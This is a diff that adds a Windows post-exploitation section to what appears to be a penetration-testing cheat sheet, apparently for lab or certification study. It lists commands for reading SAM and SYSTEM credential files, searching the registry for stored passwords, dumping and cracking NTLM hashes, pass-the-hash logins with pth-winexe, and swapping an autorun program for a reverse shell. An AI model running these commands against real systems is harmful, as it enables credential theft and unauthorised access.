@@ -602,6 +602,64 @@ Post Exploitation Windows
 
 <br>
 
+`Scheduled Tasks`  
+
+-    `dir C:\windows\tasks`  
+-    `schtasks /query /fo LIST /v`  
+
+<br>
+
+`Network`  
+
+         ipconfig | ifconfig
+         route print
+         arp -a
+         netstat -ano
+         C:\WINDOWS\System32\drivers\etc\hosts
+
+<br>
+
+`Registry`  
+
+-    Autorun  
+     `Overwrite program with reverse shell and restart`  
+     
+-    Always Install Elevated  
+     `Check Winpeas for always install elevated`  
+
+<br>
+
+`Common Files`
+
+         %SYSTEMROOT%\repair\SAM
+         %SYSTEMROOT%\System32\config\RegBack\SAM
+         %SYSTEMROOT%\System32\config\SAM
+         %SYSTEMROOT%\repair\system
+         %SYSTEMROOT%\System32\config\SYSTEM
+         %SYSTEMROOT%\System32\config\RegBack\system
+         
+<br>
+
+`Passwords`
+
+-    Use chisel to remotely forward port 445, and use winexe to log in  
+     `winexe -U <user>%<password> //<RHOST> cmd.exe`  
+     
+-    Check for passwords  
+     `reg query HKLM /f password /t REG_SZ /s`  
+     `reg query HKCU /f password /t REG_SZ /s`  
+     
+-    Weak Permissions on Sam Files  
+     `python2 pwdump.py <SYSTEMFILE> <SAMFILE>`  
+
+-    Cracking the password  
+     `hashcat -m 1000 --force <hash> <wordlist>`
+     
+-    PTH  
+     `pth-winexe -U '<entire-hash>' //<RHOST> cmd.exe` 
+
+<br>
+
 Active Directory
 ===============================================================================================
 
